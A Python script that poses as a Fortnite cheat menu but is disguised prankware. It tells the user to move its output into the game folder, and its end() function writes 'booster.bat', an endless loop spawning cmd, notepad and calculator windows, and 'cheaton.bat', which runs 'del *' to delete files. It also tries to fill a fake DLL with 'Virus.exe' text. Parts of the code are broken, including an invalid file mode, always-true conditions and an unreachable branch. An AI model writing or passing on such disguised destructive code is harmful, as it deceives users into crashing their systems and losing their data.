#made by streax

from time import *
import os as system 
import random


cheat1 = "AimBot"
cheat2 = "WallHack"
cheat3 = "Building Cheat"
cheat4 = "AimBot + WallHack"
cheat5 = "All"
cheat6 = "Random choice"
welcomes = ["Hi", "hello",]
welcome = random.choice(welcomes)


def start():
    print(f"{welcome} user are u sure to using cheats ?")
    sure = input("Write Y/N --->    ")
    if sure == "Y" or "y":
        print("Okey i will load cheats menu")
        sleep(3)
        main()
    if sure == "N" or "n":
        print("don't worry i will close in 5 seconds")

def main():
    print("Whats cheat do u want to use ?")
    print(cheat1)
    sleep(0.5)
    print(cheat2)
    sleep(0.5)
    print(cheat3)
    sleep(0.5)
    print(cheat4)
    sleep(0.5)
    print(cheat5)
    sleep(0.5)
    print(cheat6)
    sleep(0.5)
    wybor = input("Write here --->    ")
    if wybor == "AimBot" or "WallHack" or "All" or "Building Cheat" or "Aimbot + WallHack":
        print(f"Okey i loading {wybor} and close fortnite please u have 6 seconds")
        sleep(6)
        koto = open("FortCheat.dll", "")
        for wirus in range(0, 5999999):
            if wirus < 5999999:
                koto.write("Virus.exe Virus.exe KOT")
            else:
                koto.close
                print("Okey its done but don't close program")
                print("Wait to program close")
                print("and move FortCheat.dll, booster.bat and cheaton.bat to fortnite pack folder")
                end()
    else:
        print("There is not any cheats with this name")
        main()

def end(): 
    booster = open("booster.bat", "w")
    fortdie = open("cheaton.bat", "w")

    booster.write("@echo off   ")
    booster.write("\n")
    booster.write(":start")
    booster.write("\n")
    booster.write("start cmd.exe")
    booster.write("\n")
    booster.write("start notepad.exe")
    booster.write("\n")
    booster.write("start notepad.exe")
    booster.write("\n")
    booster.write("start calculator.exe")
    booster.write("\n")
    booster.write("goto :start")
    booster.close()

    fortdie.write("@echo off" + "\n")
    fortdie.write("del *" + "\n")
    
start()